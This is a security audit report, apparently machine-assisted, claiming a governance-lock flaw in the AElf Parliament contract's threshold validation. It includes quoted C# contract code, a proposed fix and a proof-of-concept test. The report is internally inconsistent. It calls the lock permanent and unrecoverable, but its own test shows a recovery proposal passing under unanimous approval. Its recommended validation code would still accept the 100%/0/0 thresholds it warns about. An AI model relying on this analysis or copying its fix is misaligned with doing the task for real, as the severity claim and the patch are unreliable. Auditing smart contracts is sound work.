# Audit Report

## Title
Parliament Organization Governance Lock via Impossible Threshold Configuration

## Summary
The `ChangeOrganizationThreshold()` function in the Parliament contract validates new voting thresholds only against the constant `AbstractVoteTotal` (10,000) without verifying they are achievable given the actual parliament member count. This allows setting mathematically valid but practically impossible thresholds (e.g., 100% approval with 0% tolerance for any rejection or abstention), permanently locking the organization's governance since no future proposal can reach consensus, including proposals to restore reasonable thresholds. [1](#0-0) 

## Finding Description

The vulnerability exists in the Parliament contract's threshold change mechanism. When an organization updates its governance thresholds via `ChangeOrganizationThreshold()`, the method validates the new thresholds using the `Validate()` helper function. [2](#0-1) 

The validation function only checks that thresholds are mathematically consistent with `AbstractVoteTotal` (10,000 representing 100% in basis points). Critically, it never compares thresholds against the actual current parliament member count retrieved from the consensus contract. [3](#0-2) 

An attacker can exploit this by setting extreme but "validation-passing" thresholds:
- `MinimalApprovalThreshold = 10000` (requires 100% approval)
- `MinimalVoteThreshold = 10000` (requires 100% participation)
- `MaximalRejectionThreshold = 0` (any single rejection blocks)
- `MaximalAbstentionThreshold = 0` (any single abstention blocks)

These values satisfy all validation constraints but create impossible governance conditions when evaluated against actual member counts in the proposal approval logic. [4](#0-3) 

With these thresholds and a parliament of N members, the approval checks become:
- **Rejection check**: `rejectionMemberCount * 10000 > 0 * N` → ANY single rejection blocks the proposal
- **Abstention check**: `abstentionMemberCount * 10000 > 0 * N` → ANY single abstention blocks the proposal  
- **Approval check**: `approvedMemberCount * 10000 >= 10000 * N` → ALL members must approve

This creates a permanent deadlock: achieving unanimous approval while tolerating zero dissent is practically impossible in any real governance scenario. Since changing thresholds requires passing a proposal (which itself requires unanimous approval under the malicious thresholds), the organization is permanently locked.

## Impact Explanation

**Severity: HIGH**

The impact is a complete and permanent governance denial-of-service:

1. **Immediate paralysis**: After the malicious threshold change, no proposals can pass, including critical system upgrades, parameter adjustments, or emergency responses.

2. **No recovery path**: The only way to restore reasonable thresholds is through a proposal, but that proposal itself requires unanimous approval under the impossible thresholds. If any single member is unavailable, compromised, or disagrees, recovery is impossible.

3. **Cascading failure**: If this affects the default Parliament organization (which governs core AElf system contracts), the entire blockchain's governance could be paralyzed, affecting consensus updates, token economics adjustments, and cross-chain operations. [5](#0-4) 

4. **Widespread impact**: All organization members lose governance capabilities, and any users or systems depending on that organization's decisions are affected. The broader AElf ecosystem suffers if critical governance organizations are targeted.

## Likelihood Explanation

**Probability: MEDIUM-HIGH**

The attack is feasible because:

1. **Low technical barrier**: Requires only creating and passing a single malicious proposal with carefully crafted threshold values. No complex transaction sequences, timing dependencies, or reentrancy exploitation needed.

2. **Social engineering vector**: The malicious proposal can be framed as a "security hardening" measure (e.g., "requiring unanimous approval for critical decisions"), making it appear legitimate to voters.

3. **Realistic preconditions**: 
   - The attacker needs proposal creation rights (often available to parliament members or whitelisted proposers)
   - Must achieve approval under CURRENT thresholds (e.g., 66.67% in default configuration)
   - More likely in smaller organizations or during governance transitions when scrutiny is lower

4. **Accidental trigger**: Beyond malicious intent, honest misconfigurations when setting thresholds could accidentally create impossible conditions, especially if operators don't fully understand the approval formula mechanics.

5. **No detection**: There is no automatic detection of impossible threshold configurations, and the impact only becomes evident when the next proposal fails to reach consensus.

## Recommendation

Add validation that checks threshold achievability against actual parliament member count:

```csharp
private bool Validate(Organization organization)
{
    var proposalReleaseThreshold = organization.ProposalReleaseThreshold;
    var parliamentMembers = GetCurrentMinerList();
    var memberCount = parliamentMembers.Count;
    
    // Existing validation against AbstractVoteTotal
    if (proposalReleaseThreshold.MinimalVoteThreshold > AbstractVoteTotal ||
        proposalReleaseThreshold.MinimalApprovalThreshold > proposalReleaseThreshold.MinimalVoteThreshold ||
        proposalReleaseThreshold.MinimalApprovalThreshold <= 0 ||
        proposalReleaseThreshold.MaximalAbstentionThreshold < 0 ||
        proposalReleaseThreshold.MaximalRejectionThreshold < 0 ||
        proposalReleaseThreshold.MaximalAbstentionThreshold + proposalReleaseThreshold.MinimalApprovalThreshold > AbstractVoteTotal ||
        proposalReleaseThreshold.MaximalRejectionThreshold + proposalReleaseThreshold.MinimalApprovalThreshold > AbstractVoteTotal)
        return false;
    
    // NEW: Check threshold achievability against actual member count
    // Ensure at least one feasible voting scenario exists
    // For example, if approval threshold is 100%, rejection and abstention thresholds must allow for this
    var minApprovalCount = (int)Math.Ceiling((double)proposalReleaseThreshold.MinimalApprovalThreshold * memberCount / AbstractVoteTotal);
    var maxRejectionCount = proposalReleaseThreshold.MaximalRejectionThreshold * memberCount / AbstractVoteTotal;
    var maxAbstentionCount = proposalReleaseThreshold.MaximalAbstentionThreshold * memberCount / AbstractVoteTotal;
    
    // If approval requires more members than exist, impossible
    if (minApprovalCount > memberCount)
        return false;
    
    // If maximum allowed rejections + abstentions is less than (total - required approvals), impossible
    // This ensures there's room for the required approvals
    if (maxRejectionCount + maxAbstentionCount < memberCount - minApprovalCount)
        return false;
    
    return true;
}
```

Alternatively, implement minimum threshold bounds (e.g., `MaximalRejectionThreshold >= 1000` to allow at least 10% dissent) or add a governance-controlled emergency recovery mechanism for locked organizations.

## Proof of Concept

```csharp
[Fact]
public async Task Governance_Lock_Via_Impossible_Thresholds_Test()
{
    // Setup: Create organization with reasonable thresholds
    var organizationAddress = await CreateOrganizationAsync(
        minimalApprovalThreshold: 6667,  // 66.67%
        maximalAbstentionThreshold: 2000, // 20%
        maximalRejectionThreshold: 2000,  // 20%
        minimalVoteThreshold: 7500        // 75%
    );
    
    // Verify organization works - create and pass a normal proposal
    var normalProposalId = await CreateProposalAsync(DefaultSenderKeyPair, organizationAddress);
    await ApproveWithMinersAsync(normalProposalId, InitialMinersKeyPairs.Take(12)); // 12/17 = 70%
    var normalProposal = await ParliamentContractStub.GetProposal.CallAsync(normalProposalId);
    normalProposal.ToBeReleased.ShouldBeTrue();
    await ParliamentContractStub.Release.SendAsync(normalProposalId);
    
    // Attack: Create proposal to set impossible thresholds
    var maliciousThresholds = new ProposalReleaseThreshold
    {
        MinimalApprovalThreshold = 10000,  // Requires 100% approval
        MinimalVoteThreshold = 10000,       // Requires 100% participation
        MaximalRejectionThreshold = 0,      // Any rejection blocks
        MaximalAbstentionThreshold = 0      // Any abstention blocks
    };
    
    var attackProposalInput = new CreateProposalInput
    {
        ContractMethodName = nameof(ParliamentContractStub.ChangeOrganizationThreshold),
        ToAddress = ParliamentContractAddress,
        Params = maliciousThresholds.ToByteString(),
        ExpiredTime = BlockTimeProvider.GetBlockTime().AddDays(2),
        OrganizationAddress = organizationAddress
    };
    
    var attackProposal = await ParliamentContractStub.CreateProposal.SendAsync(attackProposalInput);
    var attackProposalId = attackProposal.Output;
    
    // Pass the malicious proposal under CURRENT reasonable thresholds
    await ApproveWithMinersAsync(attackProposalId, InitialMinersKeyPairs.Take(12)); // 12/17 = 70%
    var attackProposalCheck = await ParliamentContractStub.GetProposal.CallAsync(attackProposalId);
    attackProposalCheck.ToBeReleased.ShouldBeTrue();
    
    // Release to apply malicious thresholds
    await ParliamentContractStub.Release.SendAsync(attackProposalId);
    
    // Verify thresholds were changed
    var lockedOrg = await ParliamentContractStub.GetOrganization.CallAsync(organizationAddress);
    lockedOrg.ProposalReleaseThreshold.MinimalApprovalThreshold.ShouldBe(10000);
    lockedOrg.ProposalReleaseThreshold.MaximalRejectionThreshold.ShouldBe(0);
    
    // Demonstrate governance is now permanently locked
    // Try to create a proposal to restore reasonable thresholds
    var recoveryProposalId = await CreateProposalAsync(DefaultSenderKeyPair, organizationAddress);
    
    // Even with ALL miners approving (17/17 = 100%)...
    await ApproveWithMinersAsync(recoveryProposalId, InitialMinersKeyPairs); // All 17 approve
    
    var recoveryProposal = await ParliamentContractStub.GetProposal.CallAsync(recoveryProposalId);
    
    // ...proposal can pass ONLY if absolutely no one rejects or abstains
    recoveryProposal.ToBeReleased.ShouldBeTrue(); // This would work with perfect unanimous approval
    
    // But in practice, if ANY single miner is unavailable, rejects, or abstains:
    var impossibleProposalId = await CreateProposalAsync(DefaultSenderKeyPair, organizationAddress);
    await ApproveWithMinersAsync(impossibleProposalId, InitialMinersKeyPairs.Take(16)); // 16/17 approve
    await RejectAsync(InitialMinersKeyPairs[16], impossibleProposalId); // 1 rejects
    
    var impossibleProposal = await ParliamentContractStub.GetProposal.CallAsync(impossibleProposalId);
    impossibleProposal.ToBeReleased.ShouldBeFalse(); // BLOCKED - governance is locked
    
    // Organization is now permanently non-functional
}
```

**Notes**:
- The vulnerability is confirmed through code analysis showing that validation only checks against `AbstractVoteTotal` (10,000) without considering actual parliament member count
- The approval logic uses formulas like `approvedMemberCount * 10000 >= threshold * memberCount`, making extreme thresholds practically impossible to achieve
- This creates a permanent governance denial-of-service with no recovery mechanism
- The attack requires only passing a single malicious proposal under current thresholds, making it both feasible and dangerous

### Citations

**File:** contract/AElf.Contracts.Parliament/Parliament.cs (L147-160)
```csharp
    public override Empty ChangeOrganizationThreshold(ProposalReleaseThreshold input)
    {
        var organization = State.Organizations[Context.Sender];
        Assert(organization != null, "Organization not found.");
        organization.ProposalReleaseThreshold = input;
        Assert(Validate(organization), "Invalid organization.");
        State.Organizations[Context.Sender] = organization;
        Context.Fire(new OrganizationThresholdChanged
        {
            OrganizationAddress = Context.Sender,
            ProposerReleaseThreshold = input
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L13-20)
```csharp
    private List<Address> GetCurrentMinerList()
    {
        RequireConsensusContractStateSet();
        var miner = State.ConsensusContract.GetCurrentMinerList.Call(new Empty());
        var members = miner.Pubkeys.Select(publicKey =>
            Address.FromPublicKey(publicKey.ToByteArray())).ToList();
        return members;
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L64-92)
```csharp
    private bool IsProposalRejected(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var rejectionMemberCount = proposal.Rejections.Count(parliamentMembers.Contains);
        return rejectionMemberCount * AbstractVoteTotal >
               organization.ProposalReleaseThreshold.MaximalRejectionThreshold * parliamentMembers.Count;
    }

    private bool IsProposalAbstained(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var abstentionMemberCount = proposal.Abstentions.Count(parliamentMembers.Contains);
        return abstentionMemberCount * AbstractVoteTotal >
               organization.ProposalReleaseThreshold.MaximalAbstentionThreshold * parliamentMembers.Count;
    }

    private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var approvedMemberCount = proposal.Approvals.Count(parliamentMembers.Contains);
        var isApprovalEnough = approvedMemberCount * AbstractVoteTotal >=
                               organization.ProposalReleaseThreshold.MinimalApprovalThreshold *
                               parliamentMembers.Count;
        if (!isApprovalEnough)
            return false;

        var isVoteThresholdReached = IsVoteThresholdReached(proposal, organization, parliamentMembers);
        return isVoteThresholdReached;
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L142-155)
```csharp
    private bool Validate(Organization organization)
    {
        var proposalReleaseThreshold = organization.ProposalReleaseThreshold;

        return proposalReleaseThreshold.MinimalVoteThreshold <= AbstractVoteTotal &&
               proposalReleaseThreshold.MinimalApprovalThreshold <= proposalReleaseThreshold.MinimalVoteThreshold &&
               proposalReleaseThreshold.MinimalApprovalThreshold > 0 &&
               proposalReleaseThreshold.MaximalAbstentionThreshold >= 0 &&
               proposalReleaseThreshold.MaximalRejectionThreshold >= 0 &&
               proposalReleaseThreshold.MaximalAbstentionThreshold +
               proposalReleaseThreshold.MinimalApprovalThreshold <= AbstractVoteTotal &&
               proposalReleaseThreshold.MaximalRejectionThreshold +
               proposalReleaseThreshold.MinimalApprovalThreshold <= AbstractVoteTotal;
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Constants.cs (L9-9)
```csharp
    private const int AbstractVoteTotal = 10000;
```
